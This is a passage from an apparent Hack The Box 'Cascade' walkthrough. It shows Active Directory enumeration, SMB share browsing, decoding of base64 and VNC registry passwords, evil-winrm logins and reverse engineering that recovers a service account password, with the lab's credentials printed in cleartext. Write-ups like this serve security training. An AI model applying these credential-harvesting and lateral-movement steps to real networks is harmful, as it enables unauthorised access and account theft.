objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
</code></pre></div></div>
<h3 id="this-seems-more-intresting">This seems more intresting..</h3>

<p><code class="language-plaintext highlighter-rouge">cascadeLegacyPwd: clk0bjVldmE=</code></p>

<h3 id="decoding-with-the-base64">Decoding with the base64</h3>

<p><code class="language-plaintext highlighter-rouge">echo "clk0bjVldmE=" | base64 -d</code></p>

<p><code class="language-plaintext highlighter-rouge">rY4n5eva</code></p>

<h2 id="using-smbclient-for-further-more-enumeration">Using <code class="language-plaintext highlighter-rouge">smbclient</code> for further more enumeration!</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">smbclient</span> <span class="o">-</span><span class="no">L</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="no">U</span> <span class="n">r</span><span class="p">.</span><span class="nf">thompson</span>
<span class="no">Enter</span> <span class="no">WORKGROUP</span><span class="p">\</span><span class="n">r</span><span class="p">.</span><span class="nf">thompson</span><span class="err">'</span><span class="n">s</span> <span class="ss">password: 

        </span><span class="no">Sharename</span>       <span class="no">Type</span>      <span class="no">Comment</span>
        <span class="o">---------</span>       <span class="o">----</span>      <span class="o">-------</span>
        <span class="no">ADMIN</span><span class="err">$</span>          <span class="no">Disk</span>      <span class="no">Remote</span> <span class="no">Admin</span>
        <span class="no">Audit</span><span class="err">$</span>          <span class="no">Disk</span>      
        <span class="no">C</span><span class="err">$</span>              <span class="no">Disk</span>      <span class="no">Default</span> <span class="n">share</span>
        <span class="no">Data</span>            <span class="no">Disk</span>      
        <span class="no">IPC</span><span class="err">$</span>            <span class="no">IPC</span>       <span class="no">Remote</span> <span class="no">IPC</span>
        <span class="no">NETLOGON</span>        <span class="no">Disk</span>      <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
        <span class="nb">print</span><span class="err">$</span>          <span class="no">Disk</span>      <span class="no">Printer</span> <span class="no">Drivers</span>
        <span class="no">SYSVOL</span>          <span class="no">Disk</span>      <span class="no">Logon</span> <span class="n">server</span> <span class="n">share</span> 
<span class="no">SMB1</span> <span class="n">disabled</span> <span class="o">--</span> <span class="n">no</span> <span class="n">workgroup</span> <span class="n">available</span>
</code></pre></div></div>
<h3 id="some-more-intresting-findings">Some more intresting findings!</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">smbclient</span> <span class="sr">//</span><span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span><span class="no">Data</span> <span class="o">-</span><span class="no">U</span> <span class="n">r</span><span class="p">.</span><span class="nf">thompson</span>
<span class="no">Enter</span> <span class="no">WORKGROUP</span><span class="p">\</span><span class="n">r</span><span class="p">.</span><span class="nf">thompson</span><span class="err">'</span><span class="n">s</span> <span class="ss">password: 
</span><span class="no">Try</span> <span class="s2">"help"</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="n">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="p">.</span>
<span class="nf">smb</span><span class="p">:</span> <span class="p">\</span><span class="o">&gt;</span> <span class="n">ls</span>
  <span class="o">.</span>                                   <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">26</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">34</span> <span class="mi">2020</span>
  <span class="o">..</span>                                  <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">26</span> <span class="mi">22</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">34</span> <span class="mi">2020</span>
  <span class="no">Contractors</span>                         <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">12</span> <span class="mi">20</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">11</span> <span class="mi">2020</span>
  <span class="no">Finance</span>                             <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">12</span> <span class="mi">20</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mo">06</span> <span class="mi">2020</span>
  <span class="no">IT</span>                                  <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>
  <span class="no">Production</span>                          <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">12</span> <span class="mi">20</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">18</span> <span class="mi">2020</span>
  <span class="no">Temps</span>                               <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Sun</span> <span class="no">Jan</span> <span class="mi">12</span> <span class="mi">20</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">15</span> <span class="mi">2020</span>

                <span class="mi">13106687</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">4096</span><span class="o">.</span> <span class="mi">7806882</span> <span class="n">blocks</span> <span class="n">available</span>
<span class="ss">smb: </span><span class="p">\</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="no">It</span>
<span class="ss">smb: </span><span class="p">\</span><span class="no">It</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">ls</span>
  <span class="o">.</span>                                   <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>
  <span class="o">..</span>                                  <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>
  <span class="no">Email</span> <span class="no">Archives</span>                      <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">30</span> <span class="mi">2020</span>
  <span class="no">LogonAudit</span>                          <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">40</span> <span class="mi">2020</span>
  <span class="no">Logs</span>                                <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mo">04</span> <span class="mi">2020</span>
  <span class="no">Temp</span>                                <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mo">06</span><span class="p">:</span><span class="mi">59</span> <span class="mi">2020</span>

                <span class="mi">13106687</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">4096</span><span class="o">.</span> <span class="mi">7806882</span> <span class="n">blocks</span> <span class="n">available</span>

</code></pre></div></div>

<p>After moving into the <code class="language-plaintext highlighter-rouge">dir</code> <code class="language-plaintext highlighter-rouge">Email Archives</code>……….</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ss">smb: </span><span class="p">\</span><span class="no">IT</span><span class="p">\</span><span class="no">Email</span> <span class="no">Archives</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">ls</span>
  <span class="o">.</span>                                   <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>
  <span class="o">..</span>                                  <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>
  <span class="no">Meeting_Notes_June_2018</span><span class="p">.</span><span class="nf">html</span>        <span class="no">A</span>     <span class="mi">2522</span>  <span class="no">Tue</span> <span class="no">Jan</span> <span class="mi">28</span> <span class="mi">13</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">51</span> <span class="mi">2020</span>

		<span class="mi">13106687</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">4096</span><span class="o">.</span> <span class="mi">7793283</span> <span class="n">blocks</span> <span class="n">available</span>


<span class="ss">smb: </span><span class="p">\</span><span class="no">IT</span><span class="p">\</span><span class="no">Email</span> <span class="no">Archives</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">get</span> <span class="no">Meeting_Notes_June_2018</span><span class="p">.</span><span class="nf">html</span>                                                                                                                                                                                 
<span class="n">getting</span> <span class="n">file</span> <span class="p">\</span><span class="no">IT</span><span class="p">\</span><span class="no">Email</span> <span class="no">Archives</span><span class="p">\</span><span class="no">Meeting_Notes_June_2018</span><span class="p">.</span><span class="nf">html</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">2522</span> <span class="n">as</span> <span class="no">Meeting_Notes_June_2018</span><span class="p">.</span><span class="nf">html</span> <span class="p">(</span><span class="mf">3.3</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mf">3.3</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span> 
</code></pre></div></div>
<hr>

<p><code class="language-plaintext highlighter-rouge">cat Meeting_Notes_June_2018.html </code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;p&gt;-- New production network will be going live on                                                                                                                                                                                         
Wednesday so keep an eye out <span class="k">for </span>any issues. &lt;/p&gt;                                                                                                                                                                                          
                                                                                                                                                                                                                                           
&lt;p&gt;-- We will be using a temporary account to                                                                                                                                                                                              
perform all tasks related to the network migration and this account will be deleted at the end of                                                                                                                                          
2018 once the migration is complete. This will allow us to identify actions                                                                                                                                                                
related to the migration <span class="k">in </span>security logs etc. Username is TempAdmin <span class="o">(</span>password is the same as the normal admin account password<span class="o">)</span><span class="nb">.</span> &lt;/p&gt;                                                                                                     
                                                                                                                                                                                                                                           
&lt;p&gt;-- The winner of the �Best GPO� competition will be                                                                                                                                                                                     
announced on Friday so get your submissions <span class="k">in </span>soon.&lt;/p&gt;                 
</code></pre></div></div>

<p>So from here I moved into the <code class="language-plaintext highlighter-rouge">Temp</code> folder and found a user <code class="language-plaintext highlighter-rouge">S.Smith</code>.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ss">smb: </span><span class="p">\</span><span class="no">IT</span><span class="p">\</span><span class="no">Temp</span><span class="p">\</span><span class="n">s</span><span class="p">.</span><span class="nf">smith</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">ls</span>
  <span class="o">.</span>                                   <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Wed</span> <span class="no">Jan</span> <span class="mi">29</span> <span class="mo">05</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">01</span> <span class="mi">2020</span>
  <span class="o">..</span>                                  <span class="no">D</span>        <span class="mi">0</span>  <span class="no">Wed</span> <span class="no">Jan</span> <span class="mi">29</span> <span class="mo">05</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">01</span> <span class="mi">2020</span>
  <span class="no">VNC</span> <span class="no">Install</span><span class="p">.</span><span class="nf">reg</span>                     <span class="no">A</span>     <span class="mi">2680</span>  <span class="no">Wed</span> <span class="no">Jan</span> <span class="mi">29</span> <span class="mo">04</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">44</span> <span class="mi">2020</span>

                <span class="mi">13106687</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">4096</span><span class="o">.</span> <span class="mi">7793278</span> <span class="n">blocks</span> <span class="n">available</span>
</code></pre></div></div>

<p>Here there is a registery found <code class="language-plaintext highlighter-rouge">VNC Install.reg</code>. let’s see what’s inside that.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cat</span> <span class="n">VNC</span> <span class="n">Install</span><span class="p">.</span><span class="n">reg</span> 
<span class="err">��</span><span class="n">Windows</span> <span class="n">Registry</span> <span class="n">Editor</span> <span class="n">Version</span> <span class="mf">5.00</span>

<span class="p">[</span><span class="n">HKEY_LOCAL_MACHINE</span>\<span class="n">SOFTWARE</span>\<span class="n">TightVNC</span><span class="p">]</span>

<span class="p">[</span><span class="n">HKEY_LOCAL_MACHINE</span>\<span class="n">SOFTWARE</span>\<span class="n">TightVNC</span>\<span class="n">Server</span><span class="p">]</span>
<span class="s">"ExtraPorts"</span><span class="o">=</span><span class="s">""</span>
<span class="s">"QueryTimeout"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">0000001</span><span class="n">e</span>
<span class="s">"QueryAcceptOnTimeout"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"LocalInputPriorityTimeout"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000003</span>
<span class="s">"LocalInputPriority"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"BlockRemoteInput"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"BlockLocalInput"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"IpAccessControl"</span><span class="o">=</span><span class="s">""</span>
<span class="s">"RfbPort"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">0000170</span><span class="n">c</span>
<span class="s">"HttpPort"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">000016</span><span class="n">a8</span>
<span class="s">"DisconnectAction"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"AcceptRfbConnections"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="s">"UseVncAuthentication"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="s">"UseControlAuthentication"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"RepeatControlAuthentication"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"LoopbackOnly"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"AcceptHttpConnections"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="s">"LogLevel"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"EnableFileTransfers"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="s">"RemoveWallpaper"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="s">"UseD3D"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="s">"UseMirrorDriver"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="s">"EnableUrlParams"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="s">"Password"</span><span class="o">=</span><span class="nb">hex</span><span class="p">:</span><span class="mi">6</span><span class="n">b</span><span class="p">,</span><span class="n">cf</span><span class="p">,</span><span class="mi">2</span><span class="n">a</span><span class="p">,</span><span class="mi">4</span><span class="n">b</span><span class="p">,</span><span class="mi">6</span><span class="n">e</span><span class="p">,</span><span class="mi">5</span><span class="n">a</span><span class="p">,</span><span class="n">ca</span><span class="p">,</span><span class="mi">0</span><span class="n">f</span>
<span class="s">"AlwaysShared"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"NeverShared"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"DisconnectClients"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="s">"PollingInterval"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mf">000003e8</span>
<span class="s">"AllowLoopback"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"VideoRecognitionInterval"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000</span><span class="n">bb8</span>
<span class="s">"GrabTransparentWindows"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="s">"SaveLogToAllUsersPath"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"RunControlInterface"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000001</span>
<span class="s">"IdleTimeout"</span><span class="o">=</span><span class="n">dword</span><span class="p">:</span><span class="mi">00000000</span>
<span class="s">"VideoClasses"</span><span class="o">=</span><span class="s">""</span>
<span class="s">"VideoRects"</span><span class="o">=</span><span class="s">""</span>
</code></pre></div></div>

<hr>

<p><code class="language-plaintext highlighter-rouge">"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f</code></p>

<p>after cracking the <code class="language-plaintext highlighter-rouge">hex</code> we  get the password as <code class="language-plaintext highlighter-rouge">sT333ve2</code></p>

<hr>

<h2 id="login-as-ssmith">Login as S.Smith</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> cascade.htb <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; 
</code></pre></div></div>

<h2 id="getting-usertxt">Getting User.txt</h2>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">s</span><span class="p">.</span><span class="n">smith</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="p">..</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">s</span><span class="p">.</span><span class="n">smith</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">Desktop</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">s</span><span class="p">.</span><span class="n">smith</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span>
<span class="mi">36</span><span class="n">e</span><span class="o">**************************</span><span class="mf">9e513</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">s</span><span class="p">.</span><span class="n">smith</span>\<span class="n">Desktop</span><span class="o">&gt;</span> 
</code></pre></div></div>

<h2 id="privilege-escalaition-part-1">Privilege Escalaition Part <code class="language-plaintext highlighter-rouge">1</code>:</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all

USER INFORMATION
<span class="nt">----------------</span>

User Name       SID
<span class="o">===============</span> <span class="o">==============================================</span>
cascade<span class="se">\s</span>.smith S-1-5-21-3332504370-1206983947-1165150453-1107


GROUP INFORMATION
<span class="nt">-----------------</span>

Group Name                                  Type             SID                                            Attributes
<span class="o">===========================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">===============================================================</span>
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\U</span>sers                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>ETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\A</span>uthenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\T</span>his Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE<span class="se">\D</span>ata Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE<span class="se">\A</span>udit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE<span class="se">\I</span>T                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE<span class="se">\R</span>emote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY<span class="se">\N</span>TLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="se">\M</span>edium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>
<p>Nothing much in this..</p>

<h3 id="proceding-with-dir-enumeration">Proceding with <code class="language-plaintext highlighter-rouge">Dir</code> enumeration.</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>Shares
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>hares&gt; <span class="nb">cd </span>Audit
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>hares<span class="se">\A</span>udit&gt; <span class="nb">ls
    </span>Directory: C:<span class="se">\S</span>hares<span class="se">\A</span>udit
Mode                LastWriteTime         Length Name                                                           
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                     
d-----        1/28/2020   9:40 PM                DB                                                                                                                                                                                                      
d-----        1/26/2020  10:25 PM                x64                                                                                                                                                                                                     
d-----        1/26/2020  10:25 PM                x86                                                                                                                                                                                                     
<span class="nt">-a----</span>        1/28/2020   9:46 PM          13312 CascAudit.exe                                                                                                                                                                                           
<span class="nt">-a----</span>        1/29/2020   6:00 PM          12288 CascCrypto.dll                                                                                                                                                                                          
<span class="nt">-a----</span>        1/28/2020  11:29 PM             45 RunAudit.bat                                                                                                                                                                                            
<span class="nt">-a----</span>       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll                                                                                                                                                                                  
<span class="nt">-a----</span>       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll   
</code></pre></div></div>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">46</span> <span class="no">PM</span>          <span class="mi">13312</span> <span class="no">CascAudit</span><span class="p">.</span><span class="nf">exe</span>                                                                                                                                                                                           
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">1</span><span class="o">/</span><span class="mi">29</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">6</span><span class="p">:</span><span class="mo">00</span> <span class="no">PM</span>          <span class="mi">12288</span> <span class="no">CascCrypto</span><span class="p">.</span><span class="nf">dll</span>   
</code></pre></div></div>
<p>Found a couple of intresting files <code class="language-plaintext highlighter-rouge">exe</code> and <code class="language-plaintext highlighter-rouge">dll</code>.</p>

<p>There was a folder <code class="language-plaintext highlighter-rouge">DB</code> and which contains <code class="language-plaintext highlighter-rouge">Audit.db</code>..</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Shares</span><span class="p">\</span><span class="no">Audit</span><span class="p">\</span><span class="no">DB</span><span class="o">&gt;</span> <span class="n">ls</span>


    <span class="no">Directory</span><span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Shares</span><span class="p">\</span><span class="no">Audit</span><span class="p">\</span><span class="no">DB</span>


<span class="no">Mode</span>                <span class="no">LastWriteTime</span>         <span class="no">Length</span> <span class="no">Name</span>                                                                                                                                                                                                    
<span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>                                                                                                                                                                                                    
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">39</span> <span class="no">PM</span>          <span class="mi">24576</span> <span class="no">Audit</span><span class="p">.</span><span class="nf">db</span> 
</code></pre></div></div>
<p>Downloaded the <code class="language-plaintext highlighter-rouge">Audit.db</code> file and looking in the contents I found <code class="language-plaintext highlighter-rouge">ArkSvcBQO5l5Kj9MdErXx6Q6AGOw==</code></p>

<p>Having a look at both the other files that we have got <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> and <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code> using <code class="language-plaintext highlighter-rouge">DNSPY</code>.</p>

<p><img src="/assets/img/sample/cascade/cascade3.png" alt=""></p>

<p><img src="/assets/img/sample/cascade/cascade1.png" alt=""></p>

<p><img src="/assets/img/sample/cascade/cascade2.png" alt=""></p>

<p>After all the <code class="language-plaintext highlighter-rouge">REverse Engineering</code> is done, the final output is the password of user <code class="language-plaintext highlighter-rouge">ARK-SVC</code></p>

<h2 id="login-as-arksvc">Login as <code class="language-plaintext highlighter-rouge">Arksvc</code>
</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">arksvc</span> <span class="o">-</span><span class="nb">p</span> <span class="n">w3lc0meFr31nd</span>

<span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span> <span class="n">shell</span> <span class="n">v2</span><span class="o">.</span><span class="mi">0</span>

<span class="no">Info</span><span class="p">:</span> <span class="no">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>

<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">arksvc</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span>
</code></pre></div></div>

<h2 id="privilege-escalation-part-2">Privilege escalation <code class="language-plaintext highlighter-rouge">part 2</code>
</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">arksvc</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="sr">/all

USER INFORMATION
----------------

User Name      SID                                           
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes                                                     
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group             
